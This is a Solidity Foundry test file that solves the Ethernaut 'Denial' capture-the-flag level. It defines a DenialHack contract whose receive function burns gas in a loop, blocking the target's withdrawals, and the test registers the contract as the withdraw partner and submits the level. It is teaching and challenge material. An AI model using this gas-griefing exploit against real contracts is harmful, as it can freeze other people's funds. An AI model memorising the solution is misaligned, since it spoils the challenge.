pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Denial } from "src/Denial/Denial.sol";
import { DenialFactory } from "src/Denial/DenialFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract DenialHack {
    constructor() { }

    receive() external payable {
        // need to consume gas so the gasleft is < 2300

        uint256 i;
        while (gasleft() > 2300) {
            i = i ** 2;
        }
    }
}

contract DenialTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testDenialHack() external {
        // level setup
        DenialFactory factory = new DenialFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
        Denial denial = Denial(payable(levelAddress));

        // attack
        DenialHack attacker = new DenialHack();
        denial.setWithdrawPartner(address(attacker));
        assertEq(denial.partner(), address(attacker));

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
